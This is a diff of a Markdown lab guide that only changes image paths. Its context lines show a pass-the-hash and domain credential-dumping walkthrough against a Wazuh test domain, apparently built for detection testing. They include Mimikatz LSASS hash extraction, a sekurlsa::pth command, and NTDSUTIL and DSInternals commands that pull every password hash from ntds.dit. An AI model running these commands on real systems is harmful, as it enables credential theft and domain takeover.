@@ -358,7 +358,7 @@ The **Pass-the-Hash (PtH)** attack is a credential theft technique that allows a
 * Replace **Windows2022DC.wazuhtest.com** with the actual domain controller name.
 * This initial attempt is expected to fail with an **Access Denied** message because the current user does not have sufficient privileges.
 
-![Access Denied](image-17.png)
+![Access Denied](/assets/image-17.png)
 
 3. **Enable Mimikatz Logging and Privilege Escalation:**
 
@@ -370,7 +370,7 @@ mimikatz # privilege::debug
 * **log passthehash.log** enables logging for the current Mimikatz session.
 * **privilege::debug** grants Mimikatz the required debug privileges to interact with LSASS.
 
-![Privilege Escalation](image-16.png)
+![Privilege Escalation](/assets/image-16.png)
 
 4. **Extract NTLM Hashes:**
 
@@ -381,8 +381,8 @@ mimikatz # sekurlsa::logonpasswords
 * Extracts credentials from the **LSASS** process memory, including **NTLM** hashes for all active sessions.
 * Look for the **NTLM hash** of a domain administrator account.
 
-![NTLM Hash Extraction](image-18.png)
-![Administrator Hash Found](image-19.png)
+![NTLM Hash Extraction](/assets/image-18.png)
+![Administrator Hash Found](/assets/image-19.png)
 
 5. **Perform the Pass-the-Hash Attack:**
 
@@ -393,7 +393,7 @@ mimikatz # sekurlsa::pth /user:Administrator /domain:wazuhtest.com /ntlm:<NTLM h
 * Replace **<NTLM hash>** with the extracted hash of the **Administrator** account.
 * This command opens a new command prompt authenticated as the target user without requiring the plaintext password.
 
-![Pass-the-Hash Attack](image-20.png)
+![Pass-the-Hash Attack](/assets/image-20.png)
 
 6. **Reconnect to the Domain Controller:**
 
@@ -437,7 +437,7 @@ C:\Windows\system32> NTDSUTIL "Activate Instance NTDS" "IFM" "Create Full C:\Fil
 * This command creates a copy of the NTDS database and registry files in the **C:\Files** directory.
 * The **SYSTEM** hive is critical, as it contains the boot key required to decrypt the **ntds.dit** file.
 
-![NTDSUTIL Command](image-22.png)
+![NTDSUTIL Command](/assets/image-22.png)
 
 2. **Extract the Boot Key:**
 
@@ -453,7 +453,7 @@ PS C:\Windows\system32> $Key = Get-BootKey -SystemHiveFilePath C:\Files\registry
 * The **Get-BootKey** command reads the **SYSTEM** hive to retrieve the boot key needed to decrypt **ntds.dit**.
 * Ensure that the path to the **SYSTEM** file is correct.
 
-![Boot Key Extraction](image-23.png)
+![Boot Key Extraction](/assets/image-23.png)
 
 3. **Extract Password Hashes:**
 
@@ -466,8 +466,8 @@ PS C:\Windows\system32> Get-ADDBAccount -All -Bootkey $Key -DBPath 'C:\Files\Act
 * This command retrieves all stored password hashes from the **ntds.dit** file.
 * Look for the **NTLM** hashes of high-privilege accounts, such as the **Administrator**.
 
-![NTLM Hash Extraction](image-24.png)
-![Administrator Hash Found](image-25.png)
+![NTLM Hash Extraction](/assets/image-24.png)
+![Administrator Hash Found](/assets/image-25.png)
 
 
 
